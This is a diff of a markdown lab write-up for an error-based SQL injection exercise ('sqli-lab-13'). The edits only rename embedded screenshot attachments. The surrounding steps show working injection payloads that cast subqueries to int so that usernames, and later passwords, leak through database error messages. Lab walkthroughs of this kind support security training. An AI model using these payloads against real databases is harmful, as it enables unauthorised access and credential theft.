@@ -2,7 +2,7 @@
 
 1. Inject a single quote and observe the following error
 
-![[attachments/sqli-lab-13/file-20260204131906171.png]]
+![[attachments/sqli-lab-13/file-20260206135416444.png]]
 
 2. Send a generic SELECT query and cast to int and note the error
 
@@ -10,7 +10,7 @@
 ' AND cast((select 1) as int)--
 ```
 
-![[attachments/sqli-lab-13/file-20260204132622057.png]]
+![[attachments/sqli-lab-13/file-20260206135416445.png]]
 
 3. Modify the payload to be an equality operator
 
@@ -24,7 +24,7 @@
 x' AND 1=cast((select username from users limit 1) as int)--
 ```
 
-![[attachments/sqli-lab-13/file-20260204133317002.png]]
+![[attachments/sqli-lab-13/file-20260206135416447.png]]
 
 5. Now get the password
 
